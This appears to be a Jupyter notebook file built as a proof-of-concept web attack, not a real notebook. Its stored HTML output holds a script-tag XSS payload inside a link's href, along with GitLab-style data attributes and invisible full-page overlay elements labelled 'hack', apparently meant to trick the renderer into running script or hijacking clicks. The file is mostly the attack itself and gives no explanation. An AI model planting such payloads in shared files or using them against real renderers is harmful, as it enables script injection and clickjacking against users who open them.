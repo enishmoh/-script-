{
  "cells": [
    {
      "metadata": { "trusted": true },
      "cell_type": "code",
      "source": "hej",
      "execution_count": 1,
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "text/plain": "<IPython.core.display.HTML object>",
            "text/html": [
              "<a href=\"<script>alert(4)</script>\" class=\"js-feature-highlight\"  data-auto-devops-help-path=\"hej\" data-highlight-id=\"1\" style=\"background-color: rgba(0, 0, 0, 0); border: 0; cursor: default; height: 100%; left: 0; position: absolute; top: 0; width: 100%; z-index: 1001\">.</a>",
            "<div  class=\"js-new-user-signups-cap-reached\"  data-defer-links=\"false\" data-feature-id=\"1\">",
            "<button style=\"background-color: rgba(0, 0, 0, 0); border: 0; cursor: default; height: 100%; left: 0; position: absolute; top: 0; width: 100%; z-index: 1000\" class=\"js-close\">",
            "hack",
            "</button>",
            "</div>"
            ]},
          "metadata": {}
        }
      ]
    }
  ],
  "metadata": {
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3",
      "language": "python"
    },
    "language_info": {
      "name": "python",
      "version": "3.7.8",
      "mimetype": "text/x-python",
      "codemirror_mode": { "name": "ipython", "version": 3 },
      "pygments_lexer": "ipython3",
      "nbconvert_exporter": "python",
      "file_extension": ".py"
    }
  },
  "nbformat": 4,
  "nbformat_minor": 4
}
